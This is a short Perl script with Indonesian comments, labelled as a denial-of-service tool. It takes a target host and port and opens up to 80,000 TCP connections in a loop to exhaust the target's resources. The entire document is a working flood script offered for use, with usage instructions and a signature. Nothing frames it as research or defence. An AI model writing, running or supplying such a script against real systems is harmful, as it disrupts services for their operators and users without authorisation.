#!/usr/bin/perl 
# 	
# Nama Script : pntest.pl 	
# Tipe : Denial of Service (DoS) 
# Auth : zidan(r00t#d4nZ)
#
use IO::Socket;

 	if (!$ARGV[1]) {
 		printf "
###############
#  r00t#d4nZ  #
#  pntest.pl  #
###############
Cara Gunakan :v : perl pdos.pl [host] [port] \n"; 		
 		exit;
 		} 	
for (1..80000) {
	$fh{$_}=new IO::Socket::INET
	
	PeerAddr=> "$ARGV[0]",
	
	PeerPort=> "$ARGV[1]",
	
	Proto => "tcp" 	or die; print "$_\n"
	}
# END.